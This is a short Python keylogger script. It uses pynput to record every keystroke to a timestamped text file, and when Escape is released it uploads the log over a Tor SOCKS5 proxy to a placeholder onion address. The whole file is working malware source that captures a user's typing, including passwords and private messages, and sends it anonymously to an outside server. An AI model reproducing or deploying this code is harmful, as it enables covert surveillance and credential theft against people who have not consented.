import requests
from pynput import keyboard
from datetime import datetime
import socks
import socket

'''Path to save your log files
log_dir = r"E:\My programs\Projects\Capture the keyLogger"
logging.basicConfig(filename = (file_name), level=logging.INFO, format='%(message)s')
'''


def set_tor_proxy(): # Tor Configuration (SOCKS5 Proxy)
    # SOCKS5 proxy to Tor
    socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
    socket.socket = socks.socksocket

def send_data_to_tor_website(data):
    
    set_tor_proxy() # Set the Tor proxy before sending the request

    try:
        tor_url = "YOUR_ONION_ADDRESS_HERE"

        response = requests.post(tor_url, data={"log_data": data})
        
        if response.status_code == 200:
            print("SUCCESSFUL..")
        else:
            print(f"Failed , Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending data to website: {e}")

# Keylogger Setup
current_datetime = datetime.now().strftime('%d-%m-%Y_%H%M%S')
file_name = "log_file_no-" + current_datetime + ".txt"

def on_press(key):
    try:
        with open(file_name, "a") as f:
            f.write(key.char)
    except AttributeError:
        with open(file_name, "a") as f:
            if key == keyboard.Key.space:
                hotkey = " "
                f.write(hotkey)
            elif key == keyboard.Key.enter:
                hotkey = " [Enter] "
                f.write(hotkey)
            elif key == keyboard.Key.caps_lock:
                hotkey = "[CAPS_LOCK]"
                f.write(hotkey)
            elif key == keyboard.Key.backspace:
                hotkey = " [BackSpace] "
                f.write(hotkey)

def on_release(key):
    if key == keyboard.Key.esc:
        # Read the log file content
        with open(file_name, "r") as file:
            log_data = file.read()

        # Send the log data to a Tor website
        send_data_to_tor_website(log_data)
        return False

# Start the keylogger
with keyboard.Listener(
    on_press=on_press,
    on_release=on_release
    ) as listener:
    listener.join()
